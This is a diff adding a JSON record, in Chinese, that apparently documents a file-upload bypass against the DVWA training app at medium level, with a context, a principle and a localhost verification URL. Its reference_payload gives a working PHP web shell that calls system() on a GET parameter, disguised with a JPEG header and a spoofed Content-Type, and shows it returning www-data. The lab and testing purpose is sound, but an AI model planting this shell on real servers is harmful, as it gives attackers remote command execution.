@@ -1,0 +1,10 @@
+[
+  {
+    "id": "auto-20261030120742",
+    "context": "DVWA medium File Upload。服务端仅校验上传文件的 Content-Type 是否为 image/jpeg|image/png（Medium 分支，校验 MIME 类型、大小 <100000，不做扩展名过滤、不校验真实图片内容）。上传目录 ../../hackable/uploads/ 下文件以 .php 被 Apache 解析。",
+    "reference_payload": "文件名 cmd.php，Content-Type: image/jpeg，文件内容 = JPEG 文件头 \"\\xFF\\xD8\\xFF\\xE0\\x00\\x10JFIF\\x00\\x01\\x01\\x00\\x00\\x01\\x00\\x01\\x00\\x00\" + \"<?php echo 'SECCHECK'; system($_GET['cmd']); ?>\"。POST /vulnerabilities/upload/ multipart 字段 uploaded=文件、Upload=Upload。上传后访问 /hackable/uploads/cmd.php?cmd=id → 返回 uid=33(www-data)。",
+    "principle": "仅靠客户端可伪造的 Content-Type + 伪造文件头（magic bytes）绕过 MIME 校验：multipart 里 content-type 由攻击者控制设为 image/jpeg，文件体加 JPEG 魔数骗取校验通过，实际扩展名仍为 .php 从而被服务器当 PHP 脚本解析 → RCE。",
+    "source": "dvwa",
+    "verify_url": "http://localhost:8081/hackable/uploads/cmd.php?cmd=id"
+  }
+]
